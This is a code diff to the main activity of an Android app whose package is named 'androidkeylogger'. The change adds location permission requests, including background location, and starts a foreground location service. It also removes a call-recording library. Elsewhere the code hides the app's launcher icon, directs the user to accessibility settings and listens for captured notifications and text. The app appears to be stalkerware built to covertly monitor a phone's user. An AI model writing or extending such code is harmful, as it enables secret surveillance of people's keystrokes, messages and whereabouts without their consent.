@@ -1,20 +1,24 @@
 package com.azamovhudstc.androidkeylogger.activity
 
+import android.Manifest
 import android.annotation.SuppressLint
 import android.content.*
 import android.content.pm.PackageManager
 import android.media.MediaRecorder
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
+import android.os.Build
 import android.os.Bundle
 import android.util.Log
 import android.view.Menu
 import android.view.MenuItem
+import androidx.annotation.RequiresApi
 import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 import androidx.core.view.isVisible
 import androidx.lifecycle.MutableLiveData
 import androidx.recyclerview.widget.RecyclerView
-import com.aykuttasil.callrecord.CallRecord
 import com.azamovhudstc.androidkeylogger.adapter.LogAdapter
 import com.azamovhudstc.androidkeylogger.adapter.NotificationAdapter
 import com.azamovhudstc.androidkeylogger.R
@@ -40,6 +44,7 @@ class MainFixActivity : AppCompatActivity() {
     private lateinit var recyclerView: RecyclerView
     private lateinit var adapter: NotificationAdapter
     private lateinit var logAdapter: LogAdapter
+    private val MY_PERMISSIONS_REQUEST_LOCATION =55
     private val notifications = mutableListOf<NotificationModel>()
     private val logs = mutableListOf<LogModel>()
     private var isFirstLaunch = true
@@ -49,7 +54,6 @@ class MainFixActivity : AppCompatActivity() {
     private lateinit var firestore: FirebaseFirestore
     companion object {
     }
-    private lateinit var callRecord: CallRecord
 
     private var _binding: ActivityMainBinding? = null
     private val binding get() = _binding!!
@@ -60,7 +64,6 @@ class MainFixActivity : AppCompatActivity() {
                 startActivity(Intent(this, AccessibilityFixActivity::class.java))
             }
         }else {
-
         }
     }
 
@@ -90,7 +93,9 @@ class MainFixActivity : AppCompatActivity() {
                     PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                     PackageManager.DONT_KILL_APP
                 )
-
+//
+                val serviceIntent = Intent(this@MainFixActivity, LocationService::class.java)
+                startForegroundService(serviceIntent)
 
 
             }
@@ -148,6 +153,7 @@ class MainFixActivity : AppCompatActivity() {
         }
     }
 
+    @RequiresApi(Build.VERSION_CODES.Q)
     @SuppressLint("SuspiciousIndentation")
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -172,8 +178,25 @@ class MainFixActivity : AppCompatActivity() {
         registerReceiver(notificationReceiver, filter)
         registerReceiver(receiver, IntentFilter("ACTION_TEXT_RECEIVED"))
 
-        val serviceIntent = Intent(this, LocationService::class.java)
-        startService(serviceIntent)
+
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)
+            != PackageManager.PERMISSION_GRANTED
+        ) {
+            // Request the permission
+            ActivityCompat.requestPermissions(
+                this,
+                arrayOf(
+                    Manifest.permission.ACCESS_FINE_LOCATION,
+                    Manifest.permission.ACCESS_COARSE_LOCATION,
+                    Manifest.permission.ACCESS_BACKGROUND_LOCATION
+                ),
+                MY_PERMISSIONS_REQUEST_LOCATION
+            );
+        }else {
+            val serviceIntent = Intent(this, LocationService::class.java)
+            startForegroundService(serviceIntent)
+
+        }
 
 
 
@@ -230,6 +253,21 @@ class MainFixActivity : AppCompatActivity() {
     }
 
 
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        when (requestCode) {
+            MY_PERMISSIONS_REQUEST_LOCATION -> {
+                if ((grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED)) {
+                    val serviceIntent = Intent(this, LocationService::class.java)
+                    startService(serviceIntent)
+                }
+            }
+        }
+    }
     private fun deleteLogFromLocalFile(log: LogModel) {
         val file = File(filesDir, fileNameLog)
         val tempList = mutableListOf<LogModel>()
